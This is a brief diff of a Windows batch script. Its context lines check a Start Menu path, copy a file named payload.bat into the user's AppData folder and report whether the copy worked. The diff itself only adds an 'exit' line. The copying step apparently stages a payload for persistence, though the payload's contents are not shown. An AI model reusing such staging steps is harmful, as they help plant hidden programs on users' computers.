@@ -4,3 +4,4 @@ if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Progr
 copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
 if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
 pause >nul
+exit
